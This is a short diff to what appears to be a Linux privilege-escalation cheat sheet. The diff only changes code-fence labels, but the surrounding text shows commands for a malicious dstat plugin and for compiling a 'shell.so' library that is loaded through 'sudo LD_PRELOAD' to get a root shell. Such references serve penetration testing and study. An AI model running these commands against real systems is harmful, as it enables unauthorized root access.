@@ -23,7 +23,7 @@ New plugins can be written inside the folder `/usr/local/share/dstat`
 
 The filename format should be `dstat_<plugin_name>.py` like `dstat_hack.py`
 
-```sh
+```bash
 vi /usr/local/share/dstat/dstat_hack.py
 ```
 
@@ -60,12 +60,12 @@ void _init()
 
 To compile use this command:
 
-```sh
+```bash
 gcc -shared -fPIC -nostartfiles -o shell.so shell.c
 ```
 
 Finally, run the file with privileges prepended with the new library
 
-```sh
+```bash
 sudo LD_PRELOAD=/tmp/shell.so <PATH>
 ```
